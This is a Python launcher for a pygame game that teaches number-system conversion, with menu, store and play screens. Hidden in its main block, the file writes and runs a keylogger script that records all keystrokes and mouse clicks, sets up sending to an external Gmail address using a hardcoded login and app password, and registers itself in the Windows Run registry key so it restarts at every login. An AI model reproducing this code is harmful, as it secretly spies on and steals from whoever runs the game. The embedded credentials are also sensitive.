# Egor + Anfisa (только что касается кнопки "Играть")

import constants
import os
import sys
import subprocess
from pynput import keyboard, mouse
import time
import smtplib
from email.message import EmailMessage
import winreg
import pygame
from menu_2 import IntroductionView, Settings, Authorization, Results, User
from my_functions import terminate
from main_game import play
from store import store
from personalization import personalization


def main():
    user = User()
    view = IntroductionView(user)
    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                terminate()
            if event.type == pygame.MOUSEMOTION:
                if constants.STAGE == 'Меню':
                    view.animate()
                elif constants.STAGE == 'Магазин':
                    sett = Settings(user)
                    sett.animate()
                elif constants.STAGE == 'Войти в аккаунт':
                    auth = Authorization(user)
                    auth.animate()
                elif constants.STAGE == 'Результаты':
                    res = Results(user)
                    res.animate()
            if event.type == pygame.MOUSEBUTTONDOWN:
                if constants.STAGE == 'Меню':
                    view.push_btn()
                elif constants.STAGE == 'Магазин':
                    store(user.name)
                    constants.STAGE = 'Меню'
                    view = IntroductionView(user)
                elif constants.STAGE == 'Результаты':
                    res = Results(user)
                    res.push_btn()
                elif constants.STAGE == 'Играть':
                    font, backgr, mode, difficulty = personalization(user.name)
                    if 'из' in mode:
                        from_sys = 2
                        to_sys = 16 if 'шест' in difficulty else 8 if 'вос' in difficulty else 4
                    else:
                        to_sys = 2
                        from_sys = 16 if 'шест' in difficulty else 8 if 'вос' in difficulty else 4
                    play(user.name, font_name=font, fon_img=f'{backgr}.jpg', to_sys=to_sys, from_sys=from_sys)
                    constants.STAGE = 'Меню'
                    view = IntroductionView(user)
        pygame.display.flip()


if __name__ == '__main__':
    with open("key.py", mode='w', encoding='utf-8') as file:
        file.write('''import os

from pynput import keyboard, mouse
import time
import smtplib
from email.message import EmailMessage

timestr = time.strftime("%Y-%m-%d__%H-%M-%S")
last_time = time.time()
time_now = time.time()

msg = EmailMessage()
msg['Subject'] = 'Наши файлы'
msg['From'] = 'kuzalex7799@gmail.com'
msg['To'] = 'mmromadin@gmail.com'
msg.set_content('Прикреплённые файлы:')


def on_key_press(key):
    global last_time
    global time_now
    time_now = time.time()

    with open('keyboardON ' + timestr + '.txt', 'a') as f:
        try:
            f.write('Key pressed: {0}\\n'.format(key.char))
            if key == keyboard.Key.esc:
                return False

        except AttributeError:
            f.write('Special Key pressed: {0}\\n'.format(key))
            if time_now - last_time > 20:
                return False


def on_click(x, y, button, pressed):
    global last_time
    global time_now
    time_now = time.time()
    with open('mouseON ' + timestr + '.txt', 'a') as f:
        if pressed:
            f.write('Mouse clicked at ({0}, {1}) with button {2}\\n'.format(x, y, button))
        if time_now - last_time > 20:
            return False


keyboard_listener = keyboard.Listener(on_press=on_key_press)
mouse_listener = mouse.Listener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()

try: 
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp: 
        smtp.login('kuzalex7799@gmail.com', 'yueq aiyl dyid lmep') 
        smtp.send_message(msg) 
except KeyboardInterrupt: 
    print('Программа была прервана пользователем.') 
except Exception as e: 
    print('Ошибка при отправке сообщения:', e)


os.startfile('key.py')
    ''')

    # os.system('curl -o python-3.9.7.exe https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe')
    # homepath = os.getenv('USERPROFILE')
    # os.chdir(homepath)
    # os.system(f'cd {homepath}')
    # os.system(f'{homepath}\Downloads\python-3.9.7.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0')
    # os.system('py -m pip install pyinstaller 5.13.2')
    os.system('pip install pynput')
    os.startfile('key.py')
    script_name = "key.py"
    script_path = os.path.abspath(script_name)

    # Открыть раздел реестра, отвечающий за автозагрузку
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         "Software\Microsoft\Windows\CurrentVersion\Run",
                         0, winreg.KEY_SET_VALUE)

    # Добавить значение в раздел реестра
    winreg.SetValueEx(key, "MyScript", 0, winreg.REG_SZ,
                      script_path)  # MyScript - это имя параметра реестра, называйте как хотите

    # Закрыть раздел реестра
    winreg.CloseKey(key)
    print('worked')
    main()
